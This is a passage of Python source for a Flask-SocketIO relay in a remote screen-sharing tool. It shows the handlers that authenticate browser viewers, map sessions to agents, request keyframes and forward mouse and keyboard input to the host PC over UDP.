                # Also refresh viewer keepalive
                with _fc_lock:
                    if addr in s.viewer_addrs:
                        s.viewer_addrs[addr] = now
            elif t == T_KEYREQ:
                _fc_request_key(s, sid)
                with _fc_lock:
                    if addr in s.viewer_addrs:
                        s.viewer_addrs[addr] = now
            elif t == T_PING:
                s.host_time = now
                with _fc_lock:
                    if addr in s.viewer_addrs:
                        s.viewer_addrs[addr] = now
                # Forward viewer ping to host so it knows someone is watching
                _fc_send_to_host(s, sid, T_PING, s.token)
        except Exception:
            pass


# ── Browser ↔ relay fastcap Socket.IO events ─────────────────────────────────

@socketio.on("fastcap_join")
def on_fastcap_join(data):
    """Browser/iOS authenticates; relay stores token and requests first keyframe."""
    session_str = str(data.get("session", ""))
    password    = str(data.get("password", ""))
    print(f"[fc] fastcap_join from sid={freq.sid} session='{session_str}' pw_len={len(password)}", flush=True)

    # PC sends UDP SID as session[:8].encode('ascii') — 8 raw ASCII bytes.
    # bytes.fromhex(session[:16]) produces a completely different byte sequence.
    # Try the wire form first; fall back to hex-decode for legacy compatibility.
    wire_sid = session_str[:8].encode("ascii", "replace")
    with _fc_lock:
        wire_live = wire_sid in _fc_sessions and _fc_host_alive(_fc_sessions[wire_sid])

    if wire_live:
        sid = wire_sid
        print(f"[fc]   using wire_sid={wire_sid.hex()} (host alive)", flush=True)
    else:
        try:
            sid = bytes.fromhex(session_str[:16])
            print(f"[fc]   wire_sid={wire_sid.hex()} NOT live, falling back to hex_sid={sid.hex()}", flush=True)
        except Exception:
            sid = wire_sid
            print(f"[fc]   hex decode failed, using wire_sid={sid.hex()}", flush=True)

    # Token must match what the PC's fastcap_host validates against —
    # the UDP T_HELLO_VIEW handler already proves the formula: sha256(pw + sid_hex).
    sid_hex = sid.hex()
    token = hashlib.sha256(password.encode() + sid_hex.encode()).digest()[:8]

    s = _fc_sess(sid)
    s.token    = token
    s.wait_key = True

    # Populate SID->agent mapping so _fc_to_socketio can route frames to hub room
    if sid_hex not in _fc_sid_to_agent:
        for ag_name, info in list(_fastcap_cache.items()):
            if info.get("session", "") == session_str:
                _fc_sid_to_agent[sid_hex] = ag_name
                print(f"[fc]   mapped sid_hex={sid_hex} -> agent={ag_name}", flush=True)
                break
        else:
            print(f"[fc]   WARN: no agent in cache has session='{session_str}'", flush=True)

    host_alive = _fc_host_alive(s)
    _fc_send_to_host(s, sid, T_KEYREQ, token)
    print(f"[fc]   T_KEYREQ sent to host, replying fastcap_ready host={host_alive}", flush=True)
    emit("fastcap_ready", {"host": host_alive})


@socketio.on("fastcap_input")
def on_fastcap_input(data):
    """Mouse/keyboard input from browser — forward to PC via UDP."""
    session_hex = str(data.get("s", ""))[:16]
    payload = data.get("d", b"")
    if isinstance(payload, list):
        payload = bytes(payload)
    elif not isinstance(payload, (bytes, bytearray)):
        return
    try:
        sid = bytes.fromhex(session_hex)
    except Exception:
        return
    s = _fc_sess(sid)
    if _fc_host_alive(s) and _fc_udp_sock and s.token:
        try:
            _fc_udp_sock.sendto(
                bytes([T_INPUT]) + sid + s.token + payload, s.host_addr
            )
        except Exception:
            pass


@socketio.on("fastcap_keyreq")
def on_fastcap_keyreq(data):
    """Browser requests a fresh keyframe."""
    session_hex = str(data.get("s", ""))[:16]
    try:
        sid = bytes.fromhex(session_hex)
    except Exception:
        return
    s = _fc_sess(sid)
    _fc_request_key(s, sid)


# ── Local dev entry point ─────────────────────────────────────────────────────

if __name__ == "__main__":
    threading.Thread(target=_fc_udp_thread, daemon=True, name="fastcap-udp").start()
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
